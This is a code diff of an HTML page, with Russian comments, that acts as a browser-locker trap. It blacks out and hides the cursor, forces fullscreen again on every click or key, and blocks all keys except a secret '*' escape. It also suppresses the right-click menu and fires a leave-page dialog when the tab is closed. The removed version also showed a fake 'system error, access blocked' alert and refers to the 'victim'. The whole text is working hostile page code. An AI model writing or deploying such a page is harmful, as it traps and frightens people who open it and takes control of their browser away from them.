@@ -2,73 +2,71 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>‎</title> <!-- Пустой заголовок -->
+    <title> </title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
+        body, html { 
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            background: #000; overflow: hidden; cursor: none; 
+        }
+        /* Невидимый слой-ловушка поверх всего */
+        #trap {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 999999; cursor: none;
+        }
     </style>
 </head>
 <body>
+
+<div id="trap"></div>
+
 <script>
-    const docEl = document.documentElement;
-    let isChaosActive = true;
+    const trap = document.getElementById('trap');
+    let isActive = true;
 
-    // Функция возврата в Fullscreen + спам алертами
-    const enterFS = async () => {
-        if (!isChaosActive) return;
-        
-        // Показываем алерт ПЕРЕД попыткой войти в FS (это сбивает фокус браузера)
-        alert("ОШИБКА СИСТЕМЫ: Доступ заблокирован");
-        
+    async function forceFS() {
+        if (!isActive) return;
         try {
-            if (docEl.requestFullscreen) await docEl.requestFullscreen();
-            else if (docEl.webkitRequestFullscreen) await docEl.webkitRequestFullscreen();
-        } catch (e) {
-            // Если браузер блокирует авто-вход, ждем следующего клика
-        }
-    };
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) await doc.requestFullscreen();
+            else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
+        } catch (e) {}
+    }
 
-    const blockEverything = (e) => {
-        if (!isChaosActive) return;
+    // Любой клик или попытка взаимодействия возвращает Fullscreen
+    window.addEventListener('click', forceFS);
+    window.addEventListener('mousedown', forceFS);
 
-        // СЕКРЕТНЫЙ ВЫХОД: Клавиша "*"
+    // Блокировка ВСЕХ клавиш
+    window.addEventListener('keydown', (e) => {
         if (e.key === "*") {
-            isChaosActive = false;
+            isActive = false;
             document.body.style.cursor = "default";
+            trap.style.display = "none";
             if (document.exitFullscreen) document.exitFullscreen();
             return;
         }
 
-        // Блокируем абсолютно все клавиши
-        e.preventDefault();
-        e.stopPropagation();
+        if (isActive) {
+            e.preventDefault();
+            e.stopPropagation();
+            // Любая клавиша (кроме *) провоцирует возврат в FS
+            forceFS();
+        }
+    }, true);
 
-        // Если нажаты Esc, F11 или любая другая клавиша — вызываем "хаос"
-        setTimeout(enterFS, 50); 
-    };
-
-    // Слушатели событий
-    window.addEventListener('keydown', blockEverything, true);
-    window.addEventListener('keyup', blockEverything, true);
-    
-    // Запрет контекстного меню (правой кнопки)
-    window.addEventListener('contextmenu', (e) => e.preventDefault());
-
-    // Слежка за выходом из Fullscreen
+    // Если вышел через Esc — ждем любого шороха, чтобы вернуть назад
     document.addEventListener('fullscreenchange', () => {
-        if (isChaosActive && !document.fullscreenElement) {
-            enterFS();
+        if (isActive && !document.fullscreenElement) {
+            // Без алертов мы просто ждем следующего клика/нажатия клавиши
+            // но визуально экран остается черным и "мертвым"
         }
     });
 
-    // Ловушка на закрытие вкладки (показывает системное окно)
-    window.onbeforeunload = () => {
-        if (isChaosActive) return "Вы уверены?";
-    };
+    // Запрет контекстного меню
+    window.oncontextmenu = (e) => { if (isActive) e.preventDefault(); };
 
-    // Активация ловушки первым кликом (жертва должна кликнуть 1 раз)
-    document.addEventListener('click', () => {
-        if (isChaosActive) enterFS();
-    }, { once: false });
+    // Системное окно при попытке закрыть вкладку
+    window.onbeforeunload = () => isActive ? "" : null;
 
 </script>
 </body>
